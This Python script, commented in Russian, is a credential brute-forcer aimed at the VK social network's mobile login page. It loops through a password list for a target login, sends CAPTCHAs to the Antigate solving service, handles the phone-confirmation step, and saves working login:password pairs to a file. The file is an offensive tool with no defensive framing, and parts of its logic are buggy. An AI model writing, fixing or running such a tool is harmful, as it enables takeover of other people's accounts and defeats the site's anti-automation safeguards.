import grab, re, urllib2
from antigate import AntiGate
from grab import GrabTimeoutError
from time import sleep

cap_key = '123 ' #Ваш ключ с Antigate
def anti(key, file): #Получение решения Captcha с Antigate
    try:
        try:
            data = AntiGate(key, file)
            return data
        except KeyboardInterrupt:
            print("quitting")
    except:
        anti(key, file)

def save(url, file): #Скачивание файла по URL
    site = urllib2.urlopen(url)
    f = open(file, 'wb')
    f.write(site.read())

def cap_solve(img):
    save(img, 'captcha.jpg')
    key = anti(cap_key, 'captcha.jpg')
    return key

def brute(login, passwords, save):
    out = open(save, 'w')
    psswrds = open(passwords,'r')

    try:
        int(login)
        prefix = True
    except:
        prefix = False

    g = grab.Grab()
    g.go('http://m.vk.com')

    for line in psswrds:
        psswrd = line.rstrip('\r\n')
        g.doc.set_input('email', login)
        g.doc.set_input('pass', psswrd)
        g.doc.submit()

        if g.doc.text_search(u'captcha'):
            all_captchas = re.findall('"(/captcha.php[^"]*)"', g.response.body)[0]
            captcha = '' + all_captchas
            key = cap_solve(captcha)
            g.doc.set_input('email', login)
            g.doc.set_input('pass', psswrd)
            g.doc.set_input('captcha_key', str(key))
            g.doc.submit()
            print("cap")
            if 'Подтвердить' in g.response.body:
                if prefix:
                    prefix1 = g.doc.rex_search('\+[0-9]*').group(0)
                    prefix2 = g.doc.rex_search(' [0-9]*').group(0)
                    pre1 = re.findall('[0-9]{1,}', prefix1)[0]
                    pre2 = re.findall('[0-9]{1,}', prefix2)[0]

                    login = login.replace(pre1, '')
                    login = login.replace(pre2, '')

                    g.set_input('code', login)
                    g.submit()
                    print(login + ':' + psswrd + '--success')
                    out.write(login + ':' + psswrd + '\n')
                else:
                    out.write(login + ':' + psswrd + '\n')
            else:
                if g.doc.rex_search('[^>]+').group(0) == 'Login | VK':
                    print(login + ':' + psswrd + '--fail')
                else:
                    print(login + ':' + psswrd + '--success')
                    out.write(login + ':' + psswrd + '\n')
    out.close()
    psswrds.close()
